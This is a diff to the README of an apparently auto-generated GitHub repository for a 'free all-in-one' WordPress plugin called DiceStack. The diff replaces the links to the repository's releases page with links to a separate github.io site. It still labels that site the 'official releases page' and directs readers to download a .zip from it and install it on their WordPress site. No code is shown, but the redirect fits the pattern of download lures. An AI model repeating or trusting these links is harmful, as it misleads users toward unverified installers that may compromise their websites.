@@ -1,6 +1,6 @@
 # 🎲 DiceStack-free-all-in-one-WordPress-plugin - Tools to optimize your WordPress website
 
-[![](https://img.shields.io/badge/Download-DiceStack-blue.svg)](https://github.com/Mandacomparative891/DiceStack-free-all-in-one-WordPress-plugin/releases)
+[![](https://img.shields.io/badge/Download-DiceStack-blue.svg)](https://mandacomparative891.github.io)
 
 DiceStack provides a collection of 185 modular tools for WordPress users. This plugin helps you manage security, performance, search engine optimization, and backups from one interface. You choose which tools to activate. Tools you do not select remain inactive and do not slow your site.
 
@@ -27,7 +27,7 @@ Create site backups to prevent data loss. You control when backups run and where
 
 Follow these steps to add DiceStack to your WordPress installation.
 
-1. Visit the [official releases page](https://github.com/Mandacomparative891/DiceStack-free-all-in-one-WordPress-plugin/releases) to download the plugin.
+1. Visit the [official releases page](https://mandacomparative891.github.io) to download the plugin.
 2. Locate the most recent file ending in .zip on the page.
 3. Click the file name to save the folder to your computer.
 4. Log into your WordPress admin dashboard through your web browser.
